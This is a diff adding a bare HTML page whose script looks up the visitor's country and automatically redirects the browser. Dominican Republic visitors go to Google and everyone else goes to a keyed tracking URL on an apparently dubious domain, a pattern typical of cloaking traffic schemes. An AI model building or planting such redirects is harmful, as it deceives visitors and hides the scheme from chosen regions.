@@ -1,0 +1,29 @@
+<html>
+  <head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  </head>
+  <body>
+<script>
+// Coutry Links
+var deFault = 'https://polo.thegadgetguru.club/?k=40e05fb7a4deb72290334f12a2bb0134&type=mainstream&subtype=global';
+var dO = 'https://www.google.com/';
+var uS = 'https://polo.thegadgetguru.club/?k=bbc768445f2be659f0aa0da4b77fae66&type=mainstream&subtype=global';
+var mX = 'https://polo.thegadgetguru.club/?k=bbc768445f2be659f0aa0da4b77fae66&type=mainstream&subtype=global';
+
+
+
+// Countries Redirect 
+$.get('https://ipapi.co/country/', (data)=>{
+switch (data) { 
+  case 'DO': window.location.href = dO;
+  break 	
+  case 'US': window.location.href = uS;
+  break 	
+  case 'MX': window.location.href = mX;
+  break 
+ 	
+  default: window.location.href = deFault;
+  
+}
+});
+</script>
